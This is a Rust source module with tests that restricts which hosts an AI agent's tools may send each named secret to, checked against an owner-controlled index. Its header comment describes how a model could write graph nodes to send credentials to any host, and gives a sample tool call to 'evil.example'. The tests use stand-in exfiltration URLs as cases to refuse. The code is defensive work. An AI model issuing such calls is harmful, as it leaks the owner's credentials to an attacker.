//! Which secret may go where (VAULT_PLAN.md Phase 0).
//!
//! `:ApiContext.auth_env_var` and `:McpServer.auth_env_var` name a secret
//! that `http_request`, `ingest_api` and `mcp_call` put on a request. Those
//! nodes live in the graph, which a model can write (`define_api_context`,
//! `neo4j_query`), and `http_request` takes an absolute URL even with a
//! context named. Before 2026-10-21 that meant any secret in the brain's
//! environment could be sent to any public host:
//! `http_request(url: "https://evil.example", context_name: "github")`.
//!
//! Now a secret named from the graph is sent only to a host the owner bound
//! it to, in the secrets index ([`index_path`], outside the repo, mounted
//! read-only). The index holds names and hosts, never values. A name with no
//! entry, a host its entry does not list, or a missing index is refused with
//! the reason; the request is not sent. Values still come from the
//! environment: the vault backends of later phases swap that, not this.
//!
//! The index is read on every call, so an owner's edit applies without a
//! restart. A secret named by a file the owner controls (search engines,
//! page readers, providers in `models.yaml`, plugin code) is not judged here:
//! a model cannot write those without the owner enabling the bundle.

use std::collections::BTreeMap;

use serde::Deserialize;

/// Every refusal carries this, so a caller can find it in an error chain.
pub const MARKER: &str = "[secrets]";

/// The index's container path unless `SECRETS_INDEX` names another.
pub const DEFAULT_INDEX: &str = "/home/agent/vault/index.yaml";

/// The index file: `secrets: { NAME: { hosts: [...], description } }`.
#[derive(Debug, Default, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Index {
    #[serde(default)]
    pub secrets: BTreeMap<String, Entry>,
}

#[derive(Debug, Default, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Entry {
    /// Hosts the secret may be sent to: `api.example.com` exactly, or
    /// `*.example.com` for its subdomains (not the bare domain).
    #[serde(default)]
    pub hosts: Vec<String>,
    #[serde(default)]
    pub description: Option<String>,
}

pub fn index_path() -> String {
    std::env::var("SECRETS_INDEX")
        .ok()
        .map(|p| p.trim().to_string())
        .filter(|p| !p.is_empty())
        .unwrap_or_else(|| DEFAULT_INDEX.to_string())
}

fn host_matches(pattern: &str, host: &str) -> bool {
    let pattern = pattern.trim().trim_end_matches('.').to_ascii_lowercase();
    let host = host.trim_end_matches('.').to_ascii_lowercase();
    match pattern.strip_prefix("*.") {
        Some(domain) => host.ends_with(&format!(".{domain}")),
        None => host == pattern,
    }
}

impl Index {
    pub fn parse(text: &str) -> Result<Self, String> {
        serde_yaml::from_str(text)
            .map_err(|e| format!("{MARKER} the secrets index is invalid: {e}"))
    }

    /// May `name` be sent to `host`?
    pub fn check(&self, name: &str, host: &str) -> Result<(), String> {
        let Some(entry) = self.secrets.get(name) else {
            return Err(format!(
                "{MARKER} {name} is not in the secrets index, so it is not sent anywhere. \
                 The owner binds a secret to its hosts in {}.",
                index_path()
            ));
        };
        if entry.hosts.iter().any(|p| host_matches(p, host)) {
            return Ok(());
        }
        Err(format!(
            "{MARKER} {name} is not bound to {host} (bound: {}), so it was not sent. \
             The owner binds a secret to its hosts in {}.",
            if entry.hosts.is_empty() {
                "nothing".to_string()
            } else {
                entry.hosts.join(", ")
            },
            index_path()
        ))
    }
}

/// Read the index now. A missing or unreadable index refuses every name.
pub fn load_index() -> Result<Index, String> {
    load_index_from(&index_path())
}

fn load_index_from(path: &str) -> Result<Index, String> {
    let text = std::fs::read_to_string(path).map_err(|e| {
        format!(
            "{MARKER} the secrets index {path} cannot be read ({e}), so no secret named \
             by an API context or MCP server is sent. The owner creates it \
             (project-docs/secrets-index.example.yaml)."
        )
    })?;
    Index::parse(&text)
}

/// The value of secret `name` for a request to `url`: refused unless the
/// index binds `name` to the URL's host. `Ok(None)`: allowed, but unset in
/// the environment (the request goes without it, as before).
pub fn resolve(name: &str, url: &str) -> Result<Option<String>, String> {
    resolve_in(&index_path(), name, url)
}

/// [`resolve`] against the index at `path`.
pub fn resolve_in(path: &str, name: &str, url: &str) -> Result<Option<String>, String> {
    let host = url::Url::parse(url)
        .ok()
        .and_then(|u| u.host_str().map(|h| h.trim_matches(['[', ']']).to_string()))
        .ok_or_else(|| format!("{MARKER} {url} has no host, so {name} was not sent"))?;
    load_index_from(path)?.check(name, &host)?;
    Ok(std::env::var(name).ok().filter(|v| !v.trim().is_empty()))
}

#[cfg(test)]
mod tests {
    use super::*;

    const INDEX: &str = "
secrets:
  GITHUB_TOKEN:
    hosts: [api.github.com]
    description: GitHub REST
  EXA_API_KEY:
    hosts: ['*.exa.ai']
  EMPTY:
    hosts: []
";

    #[test]
    fn a_secret_goes_only_where_it_is_bound() {
        let i = Index::parse(INDEX).unwrap();
        assert!(i.check("GITHUB_TOKEN", "api.github.com").is_ok());
        assert!(i.check("GITHUB_TOKEN", "API.GitHub.com.").is_ok());
        let e = i.check("GITHUB_TOKEN", "evil.example").unwrap_err();
        assert!(
            e.contains(MARKER) && e.contains("not bound to evil.example"),
            "{e}"
        );
        assert!(e.contains("bound: api.github.com"), "{e}");
        // Look-alikes are not the host.
        assert!(
            i.check("GITHUB_TOKEN", "api.github.com.evil.example")
                .is_err()
        );
        assert!(i.check("GITHUB_TOKEN", "github.com").is_err());
    }

    #[test]
    fn a_wildcard_covers_subdomains_only() {
        let i = Index::parse(INDEX).unwrap();
        assert!(i.check("EXA_API_KEY", "mcp.exa.ai").is_ok());
        assert!(i.check("EXA_API_KEY", "a.b.exa.ai").is_ok());
        assert!(i.check("EXA_API_KEY", "exa.ai").is_err());
        assert!(i.check("EXA_API_KEY", "notexa.ai").is_err());
    }

    #[test]
    fn an_unlisted_or_unbound_name_is_refused_and_says_why() {
        let i = Index::parse(INDEX).unwrap();
        let e = i
            .check("ANTHROPIC_API_KEY", "api.anthropic.com")
            .unwrap_err();
        assert!(e.contains("not in the secrets index"), "{e}");
        let e = i.check("EMPTY", "x.example").unwrap_err();
        assert!(e.contains("bound: nothing"), "{e}");
    }

    #[test]
    fn resolve_judges_the_requested_url_and_a_missing_index_refuses_all() {
        let dir = std::env::temp_dir().join(format!("secrets-test-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("index.yaml");
        std::fs::write(&path, INDEX).unwrap();
        let p = path.to_str().unwrap();
        assert!(resolve_in(p, "GITHUB_TOKEN", "https://api.github.com/repos/x").is_ok());
        let e = resolve_in(p, "GITHUB_TOKEN", "https://evil.example/collect").unwrap_err();
        assert!(e.contains("not bound to evil.example"), "{e}");
        let e = resolve_in(p, "GITHUB_TOKEN", "not a url").unwrap_err();
        assert!(e.contains("has no host"), "{e}");
        let missing = dir.join("absent.yaml");
        let e = resolve_in(
            missing.to_str().unwrap(),
            "GITHUB_TOKEN",
            "https://api.github.com/",
        )
        .unwrap_err();
        assert!(e.contains("cannot be read"), "{e}");
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn a_misspelt_field_is_an_invalid_index_not_an_open_one() {
        let e = Index::parse("secrets:\n  X:\n    host: [a.example]\n").unwrap_err();
        assert!(e.contains("invalid"), "{e}");
    }
}
